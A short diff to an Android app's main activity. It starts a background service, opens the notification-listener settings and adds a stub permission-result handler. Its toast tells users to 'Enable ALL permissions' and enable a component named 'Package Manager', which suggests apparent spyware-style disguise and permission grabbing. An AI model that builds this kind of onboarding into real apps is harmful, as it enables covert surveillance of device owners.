@@ -16,14 +16,21 @@ import android.widget.Toast;
 
 public class MainActivity extends Activity {
 
+    private static final int REQUEST_CODE_PERMISSION = 1001;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
         setContentView(R.layout.activity_main);
         startService(new Intent(this, MainService.class));
+
+
         boolean isNotificationServiceRunning = isNotificationServiceRunning();
         if(!isNotificationServiceRunning){
+
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            startActivity(intent);
 
             Context context = getApplicationContext();
             CharSequence text = "Click 'Permissions'\nEnable ALL permissions\n Click back x2\n Enable 'Package Manager'";
@@ -48,7 +55,16 @@ public class MainActivity extends Activity {
         finish();
     }
 
-
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQUEST_CODE_PERMISSION) {
+            if (!isNotificationServiceRunning()) {
+                // Permission denied by the user
+                // Handle it appropriately
+            }
+        }
+    }
 
     private boolean isNotificationServiceRunning() {
         ContentResolver contentResolver = getContentResolver();
